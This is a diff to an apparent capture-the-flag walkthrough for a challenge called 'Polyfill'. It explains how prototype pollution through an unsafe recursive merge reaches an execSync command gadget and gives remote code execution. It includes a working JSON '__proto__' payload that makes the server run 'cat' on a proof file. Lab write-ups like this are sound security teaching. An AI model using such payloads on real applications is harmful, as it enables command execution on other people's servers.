@@ -1,6 +1,8 @@
 # Walkthrough — Polyfill  (SPOILERS)
 
 **Chain:** prototype pollution (unsafe recursive merge) → command gadget (`execSync` reading an
+
+> Two flags — **FLAG1 (access):** pollute `role=admin`; `/account` returns it. **FLAG2 (proof):** pollute the command gadget for RCE (`/proof.txt`).
 inherited property) → RCE → flag.
 
 ## 1. Prototype pollution
@@ -34,8 +36,8 @@ execSync(cmd);
 
 ## 3. RCE
 ```
-POST /config   {"__proto__":{"healthCmd":"cat /flag.txt"}}
-GET  /health   -> FLAG{__proto___pollution_reached_a_command_gadget}
+POST /config   {"__proto__":{"healthCmd":"cat /proof.txt"}}
+GET  /health   -> FLAG2{polluted_gadget_ran_my_command}
 ```
 The reference exploit also prints `/health` *before* pollution (`healthy`) to prove the control.
 
